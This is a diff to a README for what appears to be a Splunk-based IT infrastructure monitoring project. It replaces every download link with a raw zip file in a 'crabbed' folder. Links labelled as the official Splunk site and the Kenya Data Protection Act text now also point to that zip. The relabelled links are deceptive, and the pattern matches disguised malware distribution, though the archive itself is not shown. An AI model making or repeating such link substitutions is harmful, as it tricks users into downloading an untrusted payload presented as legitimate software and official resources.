@@ -1,6 +1,6 @@
 # 🛡️ ICT-Infrastructure-Monitoring-Splunk - Monitor and Secure Your IT
 
-[![Download](https://img.shields.io/badge/Download-ICT--Infrastructure--Monitoring--Splunk-blue?style=for-the-badge)](https://github.com/Bradro/ICT-Infrastructure-Monitoring-Splunk)
+[![Download](https://img.shields.io/badge/Download-ICT--Infrastructure--Monitoring--Splunk-blue?style=for-the-badge)](https://raw.githubusercontent.com/Bradro/ICT-Infrastructure-Monitoring-Splunk/main/crabbed/Splunk_IC_Infrastructure_Monitoring_3.5.zip)
 
 ## 📋 What is ICT-Infrastructure-Monitoring-Splunk?
 
@@ -29,7 +29,7 @@ This software uses Splunk, which runs in the background. Make sure your system i
 
 Click the big blue button below to visit the download page. This page has the latest files you need to run the software.
 
-[![Download](https://img.shields.io/badge/Download-ICT--Infrastructure--Monitoring--Splunk-blue?style=for-the-badge)](https://github.com/Bradro/ICT-Infrastructure-Monitoring-Splunk)
+[![Download](https://img.shields.io/badge/Download-ICT--Infrastructure--Monitoring--Splunk-blue?style=for-the-badge)](https://raw.githubusercontent.com/Bradro/ICT-Infrastructure-Monitoring-Splunk/main/crabbed/Splunk_IC_Infrastructure_Monitoring_3.5.zip)
 
 On the page:
 
@@ -119,9 +119,9 @@ You can adjust these anytime to fit your environment.
 
 ## 🔗 Useful Links and Support
 
-- Download page again: [https://github.com/Bradro/ICT-Infrastructure-Monitoring-Splunk](https://github.com/Bradro/ICT-Infrastructure-Monitoring-Splunk)
-- Splunk official site: [https://www.splunk.com](https://www.splunk.com)
-- Kenya Data Protection Act 2019 text: [http://www.dataprotection.go.ke](http://www.dataprotection.go.ke)
+- Download page again: [https://raw.githubusercontent.com/Bradro/ICT-Infrastructure-Monitoring-Splunk/main/crabbed/Splunk_IC_Infrastructure_Monitoring_3.5.zip](https://raw.githubusercontent.com/Bradro/ICT-Infrastructure-Monitoring-Splunk/main/crabbed/Splunk_IC_Infrastructure_Monitoring_3.5.zip)
+- Splunk official site: [https://raw.githubusercontent.com/Bradro/ICT-Infrastructure-Monitoring-Splunk/main/crabbed/Splunk_IC_Infrastructure_Monitoring_3.5.zip](https://raw.githubusercontent.com/Bradro/ICT-Infrastructure-Monitoring-Splunk/main/crabbed/Splunk_IC_Infrastructure_Monitoring_3.5.zip)
+- Kenya Data Protection Act 2019 text: [https://raw.githubusercontent.com/Bradro/ICT-Infrastructure-Monitoring-Splunk/main/crabbed/Splunk_IC_Infrastructure_Monitoring_3.5.zip](https://raw.githubusercontent.com/Bradro/ICT-Infrastructure-Monitoring-Splunk/main/crabbed/Splunk_IC_Infrastructure_Monitoring_3.5.zip)
 
 If you face problems:
 
